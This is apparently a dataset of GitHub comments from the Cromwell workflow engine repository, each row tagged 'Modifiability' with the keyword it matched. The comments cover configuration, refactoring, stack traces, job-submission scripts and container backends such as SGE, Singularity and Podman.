PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/3413/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373823911:303,parameteriz,parameterize,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373823911,1,['parameteriz'],['parameterize']
Modifiability,":+1: Well done by the way, I was expecting removing the Await.result to be painful but that's almost a full refactoring of WorkflowActor / CallActor :smile:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155480886:108,refactor,refactoring,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155480886,1,['refactor'],['refactoring']
Modifiability,:+1: delta the one refactoring suggestion,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/353#issuecomment-171037355:19,refactor,refactoring,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/353#issuecomment-171037355,1,['refactor'],['refactoring']
Modifiability,:+1: with some grousing about code you inherited that you should feel free to ignore. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/566/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/566#issuecomment-197553637:39,inherit,inherited,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/566#issuecomment-197553637,1,['inherit'],['inherited']
Modifiability,:104); 	at scala.collection.TraversableOnce.toList(TraversableOnce.scala:294); 	at scala.collection.TraversableOnce.toList$(TraversableOnce.scala:294); 	at scala.collection.AbstractTraversable.toList(Traversable.scala:104); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4(EcmaScriptUtil.scala:111); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$4$adapted(EcmaScriptUtil.scala:107); 	at scala.collection.MapLike$MappedValues.$anonfun$foreach$3(MapLike.scala:253); 	at scala.collection.TraversableLike$WithFilter.$anonfun$foreach$1(TraversableLike.scala:789); 	at scala.collection.immutable.Map$Map2.foreach(Map.scala:146); 	at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:788); 	at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$evalExpression$1(ExpressionEvaluator.scala:43); 	at cwl.ExpressionInterpolator$.interpolate(ExpressionInterpolator.scala:140); 	at cwl.ExpressionEvaluator$.evalExpression(ExpressionEvaluator.scala:43); 	at cwl.EvaluateExpression$.$anonfun$script$2(EvaluateExpression.scala:11); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:35); 	at cwl.CommandLineBindingCommandPart.$anonfun$instantiate$5(CwlExpressionCommandPart.scala:79); 	at scala.Option.flatMap(Option.scala:171); 	at cwl.CommandLineBindingCommandPart.instantiate(CwlExpressionCommandPart.scala:78); 	at wom.callable.CommandTaskDefinition.$anonfun$instantiateCommand$3,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:2700,Enhance,EnhancedRhinoSandbox,2700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['Enhance'],['EnhancedRhinoSandbox']
Modifiability,; 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:19); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomBundleMakers$$anon$1.toWomBundle(WdlDraft2WomBundleMakers.scala:17); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); 	at wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$3(WdlDraft2LanguageFactory.scala:120); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.$anonfun$getWomBundle$1(WdlDraft2LanguageFactory.scala:119); 	at scala.util.Either.flatMap(Either.scala:338); 	at languages.wdl.draft2.WdlDraft2LanguageFactory.getWomBundle(WdlDraft2LanguageFactory.scala:118); 	at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:49); 	at scala.util.Either.flatMap(Either.scala:338); 	at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:40); 	at womtool.input.WomGraphMaker$.getBundle(WomGraphMaker.scala:22); 	at womtool.validate.Validate$.validate(Validate.scala:14); 	at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:47); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:134); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:139); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:21); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:21); 	at womtool.WomtoolMain.main(WomtoolMain.scala),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:9545,adapt,adapted,9545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['adapt'],['adapted']
Modifiability,"; [2018-11-21 15:08:54,14] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,32] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,62] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2018-11-21 15:09:03,91] [info] Slf4jLogger started; [2018-11-21 15:09:04,16] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-23ba05a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info]",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:1173,config,configured,1173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"=""$$tmpDir""; |export HOME=""$home""; |(; |cd ${cwd.pathAsString}; |SCRIPT_PREAMBLE; |); |$out=""$${tmpDir}/out.$$$$"" $err=""$${tmpDir}/err.$$$$""; |mkfifo ""$$$out"" ""$$$err""; |trap 'rm ""$$$out"" ""$$$err""' EXIT; |touch $stdoutRedirection $stderrRedirection; |tee $stdoutRedirection < ""$$$out"" &; |tee $stderrRedirection < ""$$$err"" >&2 &; |(; |cd ${cwd.pathAsString}; |ENVIRONMENT_VARIABLES; |INSTANTIATED_COMMAND; |) $stdinRedirection > ""$$$out"" 2> ""$$$err""; |echo $$? > $rcTmpPath; |$emptyDirectoryFillCommand; |(; |cd ${cwd.pathAsString}; |SCRIPT_EPILOGUE; |${globScripts(globFiles)}; |${directoryScripts(directoryOutputs)}; |); |mv $rcTmpPath $rcPath; |"""""".stripMargin; .replace(""SCRIPT_PREAMBLE"", scriptPreamble); .replace(""ENVIRONMENT_VARIABLES"", environmentVariables); .replace(""INSTANTIATED_COMMAND"", commandString); .replace(""SCRIPT_EPILOGUE"", scriptEpilogue); .replace(""DOCKER_OUTPUT_DIR_LINK"", dockerOutputDir)); }; ```; With `SCRIPT_EPILOGUE` set to default to `sync` and modifiable with the `script-epilogue` variable in the configuration (this is not explained in the Cromwell documentation but it is explained [here](https://github.com/broadinstitute/cromwell/blob/8a1297fb0e44a11421eed98c5885188972337ce9/cromwell.example.backends/LocalExample.conf)). Maybe the problem could have been solved by also replacing `$stdoutRedirection` and `$stderrRedirection` with something like `$stdoutRedirectionTmp` and `$stderrRedirectionTmp` and then replace:; ```; mv $rcTmpPath $rcPath; ```; with:; ```; mv $stdoutRedirectionTmp $stdoutRedirection; mv $stderrRedirectionTmp $stderrRedirection; mv $rcTmpPath $rcPath; ```; This way `stdout` and `stderr` would have been created in the NFS filesystem at the same time as the `rc` file and would increase the likelihood that they would all have been synced at the same time. However, this would not give the intended behavior when running in Google Cloud. Another problem that I have noticed is that there are multiple places in the Cromwell documentation t",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956:1872,variab,variable,1872,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1622071956,2,"['config', 'variab']","['configuration', 'variable']"
Modifiability,"> @TimurIs - out of curiosity, where did you find that configuration option? I don't see it documented in the [example conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf). Examined the source code. Wanted to add a manual delay in the code, but, just by luck, found the reference to this config option",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443401652:55,config,configuration,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443401652,2,['config'],"['config', 'configuration']"
Modifiability,"> @grsterin @aednichols if not an adapter from the old config, I do think a stub which throws an exception saying ""you need to update your config"" or something similar would be better than users suddenly getting cryptic errors like `""Class not found: x.y.z""`. Since it has been decided to keep support for older v2alpha1 version in addition to newer v2beta, this is no longer an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580044147:34,adapt,adapter,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580044147,3,"['adapt', 'config']","['adapter', 'config']"
Modifiability,"> @hnawar I tried us-east1, which failed. But then I saw a comment in one of the example config files that only us-central1 and europe-west2 are supported by the API, so I used us-central1. I did not actually try europe-west2. @cahrens The Life Sciences API now supports additional zones and a US region (see https://cloud.google.com/life-sciences/docs/concepts/locations )us-east1 is not in the list but other us locations now include us-west2 and us . I could not get the hello.wdl or the gatk4-germline-snps-indels to run in europe-west2 or any region other than us--central1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922906208:89,config,config,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922906208,1,['config'],['config']
Modifiability,"> @jiangkaihua I want to knwo how does cromwell generate a yaml file for volcano?; > Cromwell now genrates a bash script file when `actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""`, while vcctl job run just accept a yaml file.; > Do I need to implement a volcano backend?. Did you end up figuring this out? Has somebody implemented a Volcano backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5184#issuecomment-927790031:175,config,config,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5184#issuecomment-927790031,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"> Another option would be to set your VPC configuration to allow access to GCR from inside it. That might be useful in any case since the workflows you run might want to import tools based in external GCR locations.; > ; > I suspect you might need to allow your VPC to access other google services as well anyway - to allow it to access PAPI for example?. Thats not usable option for us. That would allow unaudited containers in our system and we cannot allow that. ; We have own container registry inside vpc and add required containers there after audit. vpc service control (https://cloud.google.com/vpc-service-controls) allows us select witch google services are usable and which are not. Basically this hardcoded container is only problem with our excisting environment. And because of that, we need to build own custom version of Cromwell (and update it), instead of just changing it in config. And it seems that we aren't only ones with same problem (based by comment in jira ticket).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167:42,config,configuration,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5586#issuecomment-662704167,2,['config'],"['config', 'configuration']"
Modifiability,"> Are there a lot of users on SGE?. I would also ask the methods team, say ldgauthier or LeeTL1220. > It's probably more a ""we don't know how"" than ""if we did, it'd be a lot of work"". Yep, we are firmly in the camp of ""we don't know how"", with a heap of ""we never rtfm'ed'. There are a number of examples out there, and folks probably willing to help us, we just haven't prioritized this ticket. I'd estimate Travis/Dockering Grid Engine as medium effort, as others have already done it. Example links for the inspired:; - Google result [example](https://github.com/gawbul/docker-sge/blob/ff400b613f5bb1eae28f16e6a47d8bb1116e9617/Dockerfile) of docker+sge (crazy number of docker layers though!); - https://support.univa.com/ would probably help us (we have a license somewhere, and can probably run it similar to how we only run JES for Broad users); - help@broad would probably help create an installer script as well. For example, years ago there was a script that installed Sun's Grid Engine via CloudFormation. Speaking of Sun Microsystems, SGE is [dead](http://www.softpanorama.net/HPC/Grid_engine/Implementations/index.shtml), as well as its successors [OGE](http://www.oracle.com/technetwork/oem/grid-engine-166852.html) and an attempted-then-abandoned FOSS fork [OGS](http://gridscheduler.sourceforge.net/). Long live [SoGE](https://arc.liv.ac.uk/SGE/), and [UGE](http://www.univa.com/products/#service2). It's fine to use ""SGE"", just like we use the term ""JES"", but we'll likely need to target specifically UGE for Broadies and/or SoGE for the rest of the Grid Engine world. > Outside of Broad we probably have more LSF users than SGE users. True, there are lots of [popular](https://trends.google.com/trends/explore?date=today%205-y&q=Grid%20Engine,%2Fm%2F082f3d,%2Fm%2F0cmb2ky,%2Fm%2F04n7lk2) grid [schedulers](https://en.wikipedia.org/wiki/Job_scheduler#Batch_queuing_for_HPC_clusters). I'd be more than happy to run yet-another-travis-job for whatever scheduler, if someone contribs the ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356:680,layers,layers,680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324116356,1,['layers'],['layers']
Modifiability,"> Are there any config properties which you know of that might help with this?. Not that I can think of unfortunately :/ One quick thing we could maybe do before the fixing it ""the right way"" would be to enable retries at the GCS library level. We've disabled it because we have our own retry mechanism which is more reliable and asynchronous (but WDL functions couldn't use it so far, which is why they're not retried). We're about to release Cromwell 30 imminently so I don't think this can make it before then but we could consider hotfixing it if this is really becoming urgent. Edit: actually looking at it more closely, even though we don't supply an ""retry settings"" to the GCS library they have default ones allowing for 6 attempts. However like I said we've found their retries to not always be reliable so it might be that for some particular errors it's not retried at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576#issuecomment-349031774:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576#issuecomment-349031774,1,['config'],['config']
Modifiability,"> Does it mean that the credentials, which Travis and Jenkins use, are default credentials and the purpose of this task is to set other ones and check that four tests were successfully passed?. Using ""default credentials"" means that any one of a very long list of configuration setups are auto-detected by the AWS Java SDK. In each SDK-configuration case, the credentials are **not** read from the cromwell-config file and then the values passed on to the AWS SDK. Instead the SDK ""discovers"" them. https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default. This ticket is to instead wire in credentials to the SDK via [Explicitly Specifying Credentials](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-explicit). In the tests:; - Each of the ""[Default Credential Provider](https://docs.aws.amazon.com/sdk-for-java/v2/developer-guide/credentials.html#credentials-default)"" options would not be configured on the system; - The `java -Dconfig.file=..."" would contain the AWS key, secret and probably region; - When the various AWS SDK functions run, they each use the passed in credentials to run the commands for S3, Batch, etc.; - The jobs should still run to completion",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165:264,config,configuration,264,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4740#issuecomment-505233165,4,['config'],"['config', 'configuration', 'configured']"
Modifiability,"> Engine support:. For streaming to/from the data storage system, the Arvados Keep data system means that the Arvados Crunch workflow manager doesn't have to wait for input files to be staged (copied) in. The Arvados Keep FUSE plugin only downloads data as the tool requests access to a particular offset. I don't think they co-schedule tasks (either on the same system or ""nearby"" nodes) for direct streaming yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694:227,plugin,plugin,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3454#issuecomment-860446694,1,['plugin'],['plugin']
Modifiability,"> For instance, now our build servers must have git secrets installed where it is irrelevant. @danbills That's not true - unless they want to commit code. This only asks them to configure a set of git hooks which they'll never end up using (or to add a compile time option which makes the compilation ignore the check).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510948597:178,config,configure,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510948597,1,['config'],['configure']
Modifiability,"> Hello! I'm not from the Cromwell developers team, but I've already tried to run Cromwell using Podman. Have you tried just to create a symbolic link named 'docker' in your `/usr/bin`? For example:; > ; > `ln -s /usr/bin/podman /usr/bin/docker`; > ; > > Probably you should check where is your podman binary with `which podman` and adapt the above command.; > ; > I ran it without changing Cromwell defaults and the workflow execution has finished successfully (as you can see in the attached log.txt file). I used [this sample workflow](https://github.com/lmtani/cromwell-cli/blob/main/sample/wf.wdl) to see it working.; > ; > `java -jar cromwell-75.jar server`, and then submit the WDL and its inputs.; > ; > [log.txt](https://github.com/broadinstitute/cromwell/files/8050279/log.txt). Hi, yes actually that was the first thing I tried but for some reasons (I already do not remember the exact error) it failed. I think that to configure backend would be cleaner way I think I'll return to it a bit later",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424:333,adapt,adapt,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6660#issuecomment-1038781424,2,"['adapt', 'config']","['adapt', 'configure']"
Modifiability,"> Hey @asmoe4; > ; > It would help to confirm that your Cromwell config contains a stanza that looks like:; > ; > ```; > engine {; > filesystems {; > s3 {; > auth = ""default""; > }; > }; > }; > ```. @ruchim -- Yes, I have the above configuration defined in my config file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-450916868:65,config,config,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4446#issuecomment-450916868,3,['config'],"['config', 'configuration']"
Modifiability,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:338,config,config,338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:528,config,config,528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957,1,['config'],['config']
Modifiability,"> Huh, I wonder how that got set to `true` for you. It appears to default to `false` in all the code and documentation I could find. I am just one of the Server user. The admin set the config of cromwell server ,and others submit the jobs to the server, so I met this problem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-838031656:185,config,config,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-838031656,1,['config'],['config']
Modifiability,"> I can follow how `forInput` is passed around, but I can't seem to discern where it is actually set - i.e. where the default value is overridden. Can you help me wrap my head around this?. [Here](https://github.com/broadinstitute/cromwell/blob/9bd4e90fdf999abc76d0ba8e801ad24eb99140b5/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/preparation/JobPreparationActor.scala#L62) in the JobPreparationActor. I agree that it is confusing. This is mostly because of the structure of the code. It has to be set in the top level class and then passed down through multiple layers. During JobPreparation the evaluation must be different. After that evaluation of the expressions in the outputs is handled, and there the default works well. I had to give the SFSBackend some info that it was being used in this way, so I had to set it all the way at toplevel and add all this code. It would be nice if there was a more straightforward way of doing this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618835746:589,layers,layers,589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618835746,1,['layers'],['layers']
Modifiability,"> I don't have a big problem with this change except that it only half-solves the problem as far as I can see - because one image might have a different root requirement than another image, and restarting Cromwell between running those two tasks is not going to be a viable answer. @cjllanwarne I do agree that different containers might have different requirements. You are completely right. However I do not think this will be a big problem in practice. . - On docker this does not matter. The docker runtime will simply create the required root folder. So there never was a problem here. - For singularity it does. But luckily there is [biocontainers](https://github.com/BioContainers/containers). These all have a `/data` folder. So there this problem is also not applicable. - In case there are people who prefer to invent their own containers instead of using those from biocontainers, they will probably invent their own standard. And if they use some other solution and build on top of that, they will probably adhere to that standard. Furthermore, implementing a solution that enables a per task configuration would:; * Drastically increase the configuration time needed to get a cromwell workflow running with singularity. By orders of magnitude. Since setting a per-task configuration is not going to be fast by any measure.; * Require more complex code to fix.; * Require complex test code to cover all use cases. I think the cost/benefit ratio is rather bad in this case. I do not think there are much use cases for fine-grained control as I outlinded above, and the code requirements are rather high. The fix in the pull request solves the problem that we have (and probably other singularity users have) in the simplest way possible. I think it covers most singularity use cases. And if some people need this per task configuration, those people can also make their own pull request :wink:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420906081:1105,config,configuration,1105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420906081,4,['config'],['configuration']
Modifiability,"> I have tried Float memory_gb = 1.0 as the runtime attribute and ${""-l mem="" + memory_gb + ""GB""} as the submit string but this fails with qsub: Illegal attribute or resource value Resource_List.mem error. `Int memory = 1` is the equivalent of `Int memory_b = 1` and is generating values in **bytes**. A WDL specifying gigs of memory will therefore generate very large values, with 4GB generating the string `-l mem=4294967296""GB""`. If you navigate within the cromwell-executions directory and find the `submit*` files that contain the generated qsub command, you should see something like that. `cd` to the directory, take the generated qsub command and try it on your cluster. Hopefully you get the same ""Illegal attribute"" error. Play around with the command until you get the correct syntax. From there we can get your Cromwell config setup such it transforms the `memory` attribute into a valid syntax. Some possible examples:. | Example qsub usage | Runtime Attribute | Description |; |------------------------|------------------------|-------------------------------------------------------------------------------------------------|; | `qsub -l mem=4.0GB …` | `Float memory_gb = 1` | decimal values allowed, units are two characters uppercase |; | `qsub -l mem=4g …` | `Int memory_gb = 1` | integer values only, no decimals, and units must be one character lowercase |; | `qsub -l mem=4000mb …` | `Int memory_mb = 1000` | integer values only, and it turns out gigabytes aren't even allowed as a unit, so use megabytes |. > I would like to use $PROJECT environment variable as the default value for raijin_project_id. Environment variables won't work within HOCON, but can be passed through down into the generated submit files. It will take a bit of escaping to get past WDL-draft2, as both POSIX and WDL-draft2 both use `${...}` for variable names. To escape past WDL-draft2, create two new runtime attributes and then use them in your submit. Example:; ```HOCON; runtime-attributes = """"""; St",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439:832,config,config,832,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4967#issuecomment-492892439,1,['config'],['config']
